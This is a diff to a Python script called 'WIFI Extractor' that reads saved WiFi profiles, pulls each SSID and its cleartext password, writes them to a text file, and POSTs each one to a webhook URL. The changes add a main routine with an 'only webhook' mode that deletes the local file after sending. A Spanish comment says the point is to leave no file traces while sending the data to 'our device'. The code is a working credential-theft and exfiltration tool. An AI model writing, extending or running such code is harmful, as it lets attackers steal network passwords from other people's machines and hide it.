@@ -1,3 +1,7 @@
+'''Thanks for using wifi extractor|Gracias por usar wifi extractor
+    GitHub repository: https://github.com/hrdax/WIFI_Extractor
+    '''
+
 import os, requests, subprocess, click
 import xml.etree.ElementTree as t
 
@@ -6,11 +10,26 @@ Archivos_XML_WIFI = []
 WIFIs = []
 
 @click.command()
-@click.option('--url', '-u', is_flag=True, default='', help='Webhook/POST URL')
+@click.option('--url', '-u', default='', help='Webhook/POST URL')
 @click.option('--only-webhook', '-o', is_flag=True, help='Only send data to webhook (no txt file) \n Envía los datos solo a la webhook (sin crear el archivo txt)')
 @click.option('--version', '-v', is_flag=True, help='Imprime la version | Prints the version')
 
+#funcion principal
+def main(url, only_webhook, version):
+    if version == True:
+        print('\nWIFI Extractor\n\nVersion 1.0\n')
+        exit()
+    elif url != '' and only_webhook == True:
+        extractor()
+        os.remove('Extracciones.txt')
+        urlweb(url)
+        print('Done! | Hecho!')
+    elif url != '' and only_webhook == False:
+        extractor()
+        urlweb(url)
+        print('Done! | Hecho!')
 
+#hara el proceso de extraccion
 def extractor():
     #crea el archivo txt
     txt = open("Extracciones.txt", "w")
@@ -36,7 +55,7 @@ def extractor():
         rt = tr.getroot()
         ssid = rt[1][0][1].text
         contrasena = rt[4][0][1][2].text
-        ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASEÑA/PASSWORD: {contrasena}"
+        ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASENA/PASSWORD: {contrasena}"
         WIFIs.append(ssid_contrasena)
         txt.write(WIFIs[conta]+"\n")
         conta = conta + 1
@@ -47,15 +66,15 @@ def extractor():
 
 #envia a la url de webhook si se especifica con la opcion -u
 def urlweb(url):
-    if url == '':
-        print('URL No especificada/No URL specified')
-        exit()
-    else:
-        #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
-        urlpost = url
+
+    #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
+    urlpost = url
+    try:
         #envia los datos a la url de webhook
         for i in WIFIs:
             requests.post(urlpost, data=i)
+    except:
+        print('Error: url not specified or invalid url | url no especificada o es invalida')
 
 if __name__ == '__main__':
     main()
